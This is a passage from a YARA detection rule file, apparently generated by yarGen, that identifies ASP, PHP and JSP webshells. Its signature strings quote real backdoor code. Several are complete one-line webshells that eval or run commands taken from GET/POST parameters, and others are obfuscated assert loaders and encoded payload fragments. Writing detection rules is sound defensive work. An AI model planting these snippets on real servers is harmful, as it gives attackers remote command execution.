      $s16 = "Set RS = Conn.execute(myStrSQL)" fullword ascii
      $s17 = "set rs = Conn.execute(\"EXEC sp_helpfile\")" fullword ascii
      $s18 = "set Rs = Conn.execute(\"Select top 1 * from \" & sTable & \"\") " fullword ascii
      $s19 = "Set RS = Conn.execute(sSQL)" fullword ascii
      $s20 = "Set Rs = Conn.execute(sSQL)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_ {
   meta:
      description = "webshell - file .asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e1e23cfb691598483accdb9a2ffe379b7ce9bb425d1089bb58327625e1b0885a"
   strings:
      $s1 = "server.scripttimeout=120" fullword ascii
      $s2 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
      $s3 = "<p class=\"tx\">Chating Room is Powered By <a href=\"http://blackbap.org\" target=\"_blank\">Silic Group Hacker Army</a>&copy;20" ascii
      $s4 = " >>> Fucked at:\"&tm&\"</p></pre>\"" fullword ascii
      $s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" />" fullword ascii
      $s6 = "uip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii
      $s7 = " Author:YoCo Smart-->" fullword ascii
      $s8 = "Set Fs=Server.CreateObject(\"Scripting.FileSystemObject\") " fullword ascii
      $s9 = "<%@ LANGUAGE = VBScript %>" fullword ascii
      $s10 = "ff = Request.ServerVariables(\"SCRIPT_NAME\")" fullword ascii
      $s11 = "response.write \"<script>location.replace(location.href);</script>\"" fullword ascii
      $s12 = "<p><a href=\"#img\" onclick=\"document.getElementById('what').value+='[img]" fullword ascii
      $s13 = "#37;\"),\"(\",\"[\"),\")\",\"]\"),\"/\",\"&#47;\"),\"'\",\"&#39;\"),\"\"\"\",\"&#34;\")" fullword ascii /* hex encoded string '7G94' */
      $s14 = "<form method=post action=\"?\">" fullword ascii
      $s15 = "data = replace(data,\"[img]\",\"<img src=\"\"http://\")" fullword ascii
      $s16 = "response.buffer = true" fullword ascii
      $s17 = "If uip = \"\" Then uip = Request.ServerVariables(\"REMOTE_ADDR\")" fullword ascii
      $s18 = "File.Close" fullword ascii
      $s19 = "data = replace(replace(replace(replace(replace(replace(replace(replace(replace(data,\"http://\",\"\"),\"<\",\"&lt;\"),\">\",\"&g" ascii
      $s20 = "File.Writeline txt" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 6KB and
      8 of them
}

rule php_niu_1 {
   meta:
      description = "webshell - file php_niu_1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c68a0fa132216213b66a114375b07b08dc0cb729ddcf0a29bff9ca7a22eaaf4"
   strings:
      $s1 = "$_($___[_]); // assert($_POST[_]);" fullword ascii
      $s2 = "$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';" fullword ascii
      $s3 = "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';" fullword ascii
      $s4 = "$___=$$__;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_xiaom {
   meta:
      description = "webshell - file xiaom.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a345a9f62fcf83de9b7dfbf710ed726a998360fc8f6460d52cc6ee5953ce39f0"
   strings:
      $s1 = "<?php @$_=\"s\".\"s\"./*- " fullword ascii
      $s2 = "*-*/\"e\"./*-/*-*/\"r\";@$_=/*-/*-*/\"a\"./*-/*-*/$_./*-/*-*/\"t\";@$_/*-/*-*/($/*-/*-*/{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}[/*" ascii
      $s3 = "//////////////////// " fullword ascii
      $s4 = "*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>WooYun" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_xslt {
   meta:
      description = "webshell - file xslt.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0d3ee83adc9ebf8fb1a8c449eed5547ee5e67e9a416cce25592e80963198ae23"
   strings:
      $s1 = " <xsl:template match=\"/root\">" fullword ascii
      $s2 = "$xml='<root>assert($_POST[a]);</root>';" fullword ascii
      $s3 = " </xsl:template>" fullword ascii
      $s4 = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:zcg=\"http://php.net/xsl\">" fullword ascii
      $s5 = "$xsl='<?xml version=\"1.0\" encoding=\"UTF-8\"?>" fullword ascii
      $s6 = "$proc->importStyleSheet($xsldoc);" fullword ascii
      $s7 = "</xsl:stylesheet>';" fullword ascii
      $s8 = "$proc->registerPHPFunctions();" fullword ascii
      $s9 = "$xsldoc = DOMDocument::loadXML($xsl);" fullword ascii
      $s10 = "$xmldoc = DOMDocument::loadXML($xml);" fullword ascii
      $s11 = "$proc->transformToXML($xmldoc);" fullword ascii
      $s12 = "$proc = new XSLTProcessor();" fullword ascii /* Goodware String - occured 2 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule b374k_2_2_poly {
   meta:
      description = "webshell - file b374k-2.2.poly.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b091e2a8f6d488741deda53e0109d3b95f4a12db6f0ec3ba3a7496583d1ae08a"
   strings:
      $x1 = "eval(gzinflate(base64_decode(\"HJ3HjuvcckZf5cLwwAYHzAmGAVOMYs5p8oM55yCST2/2HR30aYlh76qv1mqp1cW6Tus/azFP696M1X9B//0//7cV+z97MxT/9" ascii
      $s2 = "// shell password, fill with password in md5 format to protect shell" fullword ascii
      $s3 = "uaZ2jgiQNpNEjS4m97XlOkZLElrSH/PGpBNzDsz4d+fOc5uLJtmaa6rr9UGUXEQ0U7cLQDde3ob8SInReYeCILOO9zR9rraXF8pr1WqJdpx0RjQZy+QiYoepdY58OBr6" ascii
      $s4 = "dTu23uAgwYbKJ6FDlo1hGlV8ZAxIEV3g0rDydGvYLCbvU1TrkjKGTMOjAFzmYoxRBzhC32GqwVMk+kYg9fnyIcJi0Mn9dRzC7TalOGYROhj6J/WBnxWpiNnXU07ja0kt" ascii
      $s5 = "LZmX/Q3BKpZItrRSolwsoEi+tmqAKpzda+P/RuxrsLuxnFL0C7e6FO7Qn3D6WV22xda0ftPx47Ot15O6U5mwsfhxQCsTF3RBgnT6gkNfm0F4QaLt6CflLPMqiRz91jbp" ascii
      $s6 = "3DlS9ryXAYcuToDykgzekhg4B+fDzsYWvpOjQN1pUn9csbPsDRD9kTpDzs+i0XIoT0Ft6DceMW1Qs8MwyCycbW3VODELlhiVQBCfTpKVI0YCwmTsDbqnvUGS9xKjY4b5" ascii
      $s7 = "Xjp/vHwxgjyZnI/mo499tgcPOjQMEol7JU3m9WlN6wWvth+ef8zBJYgivfiEBi1hrdQ95PbrHUmIbZfGxdZs4eDMcQcizUQyXd7z2XfTps0AFmPbAmVZWoDLYhOkWvQi" ascii
      $s8 = "aCmTHSY5EVLRZ1xfVG5TxiRcsc8EynMpB9dm/so25lqOunYJi67MWuULlJmx70lnDtZmgLNCmHitIY2zh2odjT7vhtnyiLu8Ii26/apKK6DLOzuKgY10JZPkQWmZMGh2" ascii
      $s9 = "Z347I0Ba43YtrVWuwtfkkgSveM7u9Y0wqCyZHuGaIPkh+YIlSXVaaYyi8SNuSHmwVNSmLh8dyg3aYIB2YdxdTyTircHjV34qAGSmjDE1VJ06FpVm2LHo6qkOT3m8diXc" ascii
      $s10 = "Zc7XI25E7GKeNazgO7Fevl+EG4404f87mMZ5us+h/W5KM5pfuqMZ9HjLcBAoGG35+vK3wzB13aJ/zEG2YGhqu2YTGcBGBxbN23tgEt9bGl3CEmrjIg/exjw32w7Wrmsn" ascii
      $s11 = "mTUzLCVxONYnCY3p4BO1AfYKev+LoEiTl3BoWYoJjIdsQvK/Ldxz0HZuer48M1V+mjd4hSNNoGeTs0ujX/ncifCW1Vig2BDr6mhwzxFlFT8lh3p40wQE39pG3XTGe/L7" ascii
      $s12 = "kwvVl2BaB/hNLddDYId7viu1CHHWiJnbyaPuPf3vyouahUjubvpsIZgY8SRjT0SoNFX6x4Mz62FVwG0UmaH+Abl5017XHvTpLspYB4qDgtMhx5GN/2xppHn/23fhEIiE" ascii
      $s13 = "KDMS57MNnAqZDFISgOzbgvEdYB+QNz/QD5mebFzVnJo8kuCs6dJBy6ab/TppyQZnipigrsCM5SJu9Ndg1TKKyUEY+JuTtlojb3M0lr5HXmjtdx7bQdUi/rYoTWMcf27a" ascii
      $s14 = "GZttnJ6ZEqoEgeZ8kVB3tmp79vW7CN+0PF7/5TD81Xjo6rGDZ7Z/PM0ltXdc/ysZ88OOtTo3r/wbU7AFn0HcmfeGZRX/pqpYzXazt/QhhhwPosQb3gyVAwUWrx+CVCVa" ascii
      $s15 = "f2sR/qK+FXe07tEfzGjMZ2+ZHQ+4KgulSEkubmKHY7CVdiL262RlqIgl3B00YP7Q2Kq0b9/FMhtsQ/mbdG1urr3eaPyOW3WKH/mCDZYP23lm2Cx1Spp9IbCMdgNMguyd" ascii
      $s16 = "eisj7T0viCW5w/dYCC+OhbC7ltkiyuaxHkuH1HyuUqbqCD8KB54vjm11XJdcmDFATNRh0EcUBZ7RQOvfElcQy97/WNtIFAYa31ZMgzO8ceZ+LsMWrCu2DJw4DT5mmlFm" ascii
      $s17 = "5B9YcnSYIk0Xswc6HxfyOWgRRJ7vhH1KOWfuqN+TrRR1zUfaVGv1Kn6Ln35NJPXuNrpI+Y02nj/ta/cFuJTs09IJCcJ66KMOm2PfpM9vHLYf1NSeeMEhgTtOdNCPGAIM" ascii
      $s18 = "kFR0dfYFEXXHOd3Ff3t1SYJUTeWb9+KGTG/YCWUknyckBAO59brhxIEQRSPNLPt5+tJ9WXlJkViO/UEDcLCzEaHr2plJe6Se4O5X1R0RJq+ea0ecbBvTt2JqHFF/vhrK" ascii
      $s19 = "kaxLEDBAH565I1osEEXQVUeudpjMWKxfoa1jJjFg1UMeDpLG9CZ4VcbRaWwIwpEP21HBYVbWum2mo4GM58yv0VkWKwwuIrP8dCDFG0J66cIqouln4Qxbl8Xd/tUxrJ9T" ascii
      $s20 = "+AFwmy/IrRFGxQ1wA3C0p3uOHGkQ0dmIrsKDgE8u2aLVgwvtaiQ4eKbisXUdRe8RVWjBO5CcZfMq2E/YSS1DYOiT0lL70Q5MkpYeYCNLKemVvYygo8jwvp32MQPIIVUP" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule b374k_2_2_min {
   meta:
      description = "webshell - file b374k-2.2.min.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "955f3b6680ae5d0a4f54b411d51cc99d7519f1d6fd0d464b10bc80278198c610"
   strings:
      $s1 = "// shell password, fill with password in md5 format to protect shell" fullword ascii
      $s2 = "TwNHJ7iK1r8UkmAQchzCPHnEH6PJMBI5zmExHMIv0sSYDz1HEbyOYzfYdlg83vLViB8atmKar/Ist2juA8Mn1i2FxEU3XyRa4+ZdpVR+Uwn+OGftp8" fullword ascii
      $s3 = "zdA1Nw4NOR3sKkT24qXtQe6q3lO6F7W0wDb83rZq1O9rBEkBML9+W1+7zxg7rUvdUs/lQqmAzZmUE4Nzifv/P0Con8H97JlE8kA7aP7z2+e2JeHGg6" fullword ascii
      $s4 = "tG5I21PnUTK29aPYE2TwmFrdablwqVInIisetpmsJFTpa6x1zD4ymnpJtxUN4Vwi1bUWUaWqubo19sGxUGuREMAaHCTHwKrw4lmvtjX0QWXcSmMFue" fullword ascii
      $s5 = "d2G8RwFHE1+Hxu7KgWNnWfxT+UMRQy5+v3Gn21pXswISXyO7f5rdXZDdf3pe+O909mb34XHqP3WTXZ73DLl4URWhRlN+MBnjnG/K7myet7unD4KiGl" fullword ascii
      $s6 = "$s_pass = \"\";" fullword ascii
      $s7 = "WeN4eJw7iVBJHC62hqKwe174pbINmvA26/huTsZDEh3+RRHFMvSGcybosbbDOwz9zND4vO9Mk/vjSze5adwBZ8/lzNA2XGPmb0HDd4ZdnBT9OFnFJ4" fullword ascii
      $s8 = "Ru1LWrP7SKW3E4D2xPwNd2h2ZFUD0lMOHZwFxsfhsAyORp5ZBcKw3W4A88i22NViHb8vjV3ers9N+qGK7R7YERuhfWDXqVdRafzg11jdp7SPNp15dh" fullword ascii
      $s9 = "iqyQvV1GubsbinsDjiezsQ6eaiN4EMeVF0w6HTbQnmswsPi45konb6rrV8joGRro8EczrdI2U09luUHdmbSPc2vXDtqJjq2AqGevddOdNGpWVZemoH" fullword ascii
      $s10 = "9mU/MR/GpQ7zPiTKnmE03PrYT0CbIiqkEyisO9Uq7S8/6wD7/42Kq9D5dzSdm3qihaRZp7YdiTuOXGnIA6WvN+Knqb8GIQ0ZcM+HnMCoylPhzRjOg4" fullword ascii
      $s11 = "S7COMXx+Dg2UvwYOgslcF306ES6YieD+JTqBDkh/UyAZCscPy5R7NBzzNdmvdh7wZrWdm/kn+fElidiQWNImZqf1c7uRTrd5DRkF8llH+Al6eenIxq" fullword ascii
      $s12 = "Lb8V7t8G3gh3M3xRgxVGNfrQNxMKHJ3fvYZS6a8yrkWiMbOe27KKPiv1SrfZg8oCh4YppE/0HReUgLv6nXwlO3CUe6PMiuT7QZBMaBqI/sPVm3UaYa" fullword ascii
      $s13 = "VeP5mEzE8bVSiXBSJVU5g6KJ8J6duzVtMQ59ivrrd8d9m0zObii355NnNhf7yRxh3HrY8fDaodZhx42wjQVrViNkWhhDejqYUKmkU045IFoO5tQGmo" fullword ascii
      $s14 = "Ul7iqusQPUN3TAvSvqrrfkx39KL0fZ5sX/nN0nryq8+S/TufJqzpP/mt1nvzt6Dx5VefJH6DzX7tv599M6UPfsLXSmG61f4NaT8+5ElIqOA6nE+aBB" fullword ascii
      $s15 = "3egQI4IbVBa62WC5shNWNJLmmhY2x0UxQIhrEMxUWc3FaM3eHkG/PWHRYa4r2aBzwE55usrFqWuMIG42leFOdaJqB7Lm6StEtVUY2RrobiBLartG9t" fullword ascii
      $s16 = "JGbZKcG192NS6kUkt1LFmNhfITMTjaV/l/O5SopnRUZLGTZKv9FcLAWsd9Hnk9DRivkYiNq2pzYFokntlshO25mYatLuCYaz6R33aWLFhgh8Ga2qjj" fullword ascii
      $s17 = "6QCeIFEA4JFGtXJFpP0BRbhERHUFnUMbW/tFabw8bA+dPatrbi1LWW6q9MExre5Brm2haW65zg0NGOKSKcgymq1MLR+SPC1kbZNT6z2G6M4XGr7Ki9" fullword ascii
      $s18 = "/KLq5iiIfqcwyAOGVdMuRS5UEfsh8wnn5HnDRPL/Lv4gvRvzj+Uvn88CfxvMrXl1jYfo8C9P/zSxMAx3I7a/DRPDnOS4+z8I/5tp9OpjgdX4+rPOh/" fullword ascii
      $s19 = "2gDlRl2pzg7vKcFDWVLGpNwYHPh2qK9ds1uUbsdiVuNDYXvEEQTxZWSDkhxoKGTBnDhi92IGG3nFqtp4drl+72Y06bpkeJ9gmpKg/UupoAG09Q+ntG" fullword ascii
      $s20 = "UatzKYrax71OyF/PEhWW+hvTT5m0WRR6cSrpThDI2FobZNGfSKaB7sjdhGCYCfjYV2OVX3ru5S+NqllYAzXxz1PpRsPp9s6Ppmj82mzenSW65qpOQL" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      8 of them
}

rule zone_hackbar {
   meta:
      description = "webshell - file zone_hackbar.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c871183444dbb5c8766df6b126bd80c624a63a16cc39e20a0f7b002216b2ba5"
   strings:
      $s1 = "$sF=\"PCT4BA6ODSE_\";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[" ascii
      $s2 = "$sF=\"PCT4BA6ODSE_\";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[" ascii
      $s3 = "]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n985de9'];if(isset($s22)){eval($s21($s22));}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule system2022_08_22 {
   meta:
      description = "webshell - file system2022-08-22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "38531d1454ff48434ccf1ceca6f9aa8243c1365bf74cac2d056f14fc096a674a"
   strings:
      $s1 = "$_REQUEST[1] = \"//book[php:functionString('system', '$cmd') = 'PHP']\";" fullword ascii
      $s2 = "$cmd = $_GET[3];" fullword ascii
      $s3 = "$_REQUEST[2] = [\"php\", \"http://php.net/xpath\"];" fullword ascii
      $s4 = "$clazz->getMethod(\"registerPHPFunctions\")->invoke($instance);" fullword ascii
      $s5 = "$clazz->getMethod(\"query\")->getClosure($instance)->__invoke($_REQUEST[1]);" fullword ascii
      $s6 = "// Author:LemonPrefect" fullword ascii
      $s7 = "// dom and xml needed, install php-xml and leave php.ini as default." fullword ascii
      $s8 = "$xml = <<< XML" fullword ascii
      $s9 = "$doc = new DOMDocument;" fullword ascii
      $s10 = "$instance = $clazz->newInstance($doc);" fullword ascii
      $s11 = "$doc->loadXML($xml);" fullword ascii
      $s12 = "$clazz->getMethod(\"registerNamespace\")->getClosure($instance)->__invoke(...$_REQUEST[2]);" fullword ascii
      $s13 = "        <author>H3h3QAQ</author>" fullword ascii
      $s14 = "        <author>LemonPrefect</author>" fullword ascii
      $s15 = "<books>" fullword ascii
      $s16 = "</books>" fullword ascii
      $s17 = "$clazz = (new ReflectionClass(\"DOMXPath\"));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule webshell_jsp_t00ls1 {
   meta:
      description = "webshell - file t00ls1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
      $x2 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x4 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 Yu-brother </span><a href=\\\"http://www.forjj.com\\\" target" ascii
      $x6 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
      $s7 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s8 = "out.println(\"<html><head><title>JspSpy Private Codz By - Yu-brother</title><style type=\\\"text/css\\\">\"+" fullword ascii
      $s9 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s10 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s11 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s12 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s13 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s14 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 Yu-brother </span><a href=\\\"http://www.forjj.com\\\" target" ascii
      $s15 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s16 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s17 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s18 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s19 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total (unkn" ascii
      $s20 = "\\\\cmd.exe\")+\"\\\"/>\"+" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule webshell_jsp_t00ls {
   meta:
      description = "webshell - file t00ls.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
      $x2 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
      $x3 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x4 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
      $x5 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
      $x6 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $s7 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
      $s8 = "out.println(\"<html><head><title>JspSpy Private Codz By - Ninty</title><style type=\\\"text/css\\\">\"+" fullword ascii
      $s9 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s10 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
      $s11 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
      $s12 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
      $s13 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
      $s14 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $s15 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"\\\"><input type=\\\"hidden\\\" name=\\\"o\\\" val" ascii
      $s16 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"+" fullword ascii
      $s17 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
      $s18 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')\\\">View</a> | <a href=\\\"javascript:doPost({o:'e" ascii
      $s19 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total (unkn" ascii
      $s20 = "\\\\cmd.exe\")+\"\\\"/>\"+" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_20220207 {
   meta:
      description = "webshell - file 20220207.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2e8da789af525e2c2b3870ccfcf56776b810c6602d8ff8bf5842c5998c6341f2"
   strings:
      $s1 = "<?=`$_GET[_]`?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule XpHp {
   meta:
      description = "webshell - file XpHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9f75168b1b97491a5319923cf1d1ce12083397080f0cf1dbf9398d741b4a7d12"
   strings:
      $s1 = "<?php $s=@$_GET[2];if(md5($s.$s)==\"e67c2597ecad64bb4cdad6633b04107f\")@eval($_REQUEST[$s]); ?>" fullword ascii
      $s2 = "e67c2597ecad64bb4cdad6633b04107f" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule 2015_06_10_01 {
   meta:
      description = "webshell - file 2015-06-10-01.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a51766ab6470e2fcb0a314aac36f2965b8be40ed600caffef3577653c454bcf7"
   strings:
      $s1 = "<?php $x=base64_decode(\"YXNzZXJ0\");$x($_POST['c']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_niu_3 {
   meta:
      description = "webshell - file php_niu_3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "24ad7ac832d9b239ea472a4e01b173d8e6e6d1e1c947395af5152f0d9e701201"
   strings:
      $s1 = "$___($_[_]); // ASSERT($_POST[_]);" fullword ascii
      $s2 = "$_=@\"$_\"; // $_='Array';" fullword ascii
      $s3 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R" fullword ascii
      $s4 = "$_=$$____;" fullword ascii
      $s5 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
      $s6 = "$_=$_['!'=='@']; // $_=$_[0];" fullword ascii
      $s7 = "$___=$_; // A" fullword ascii
      $s8 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S" fullword ascii
      $s9 = "$__=$_;" fullword ascii
      $s10 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P" fullword ascii
      $s11 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O" fullword ascii
      $s12 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T" fullword ascii
      $s13 = "$____='_';" fullword ascii
      $s14 = "$__++;$__++;$__++;$__++; // E " fullword ascii
      $s15 = "$_=[];" fullword ascii
      $s16 = "$____.=$__;" fullword ascii
      $s17 = "$___.=$__; // S" fullword ascii
      $s18 = "$___.=$__;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule webshell_php_no2 {
   meta:
      description = "webshell - file no2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "134e4ee94191732026c93112512f16653a5c4ae03593e357b8d4126e232267a1"
   strings:
      $s1 = "$___(base64_decode($_[_])); // ASSERT($_POST[_]);" fullword ascii
      $s2 = "$_=@\"$_\"; // $_='Array';" fullword ascii
      $s3 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R" fullword ascii
      $s4 = "$_=$$____;" fullword ascii
      $s5 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
      $s6 = "$_=$_['!'=='@']; // $_=$_[0];" fullword ascii
      $s7 = "$___=$_; // A" fullword ascii
      $s8 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S" fullword ascii
      $s9 = "$__=$_;" fullword ascii
      $s10 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P" fullword ascii
      $s11 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O" fullword ascii
      $s12 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T" fullword ascii
      $s13 = "$____='_';" fullword ascii
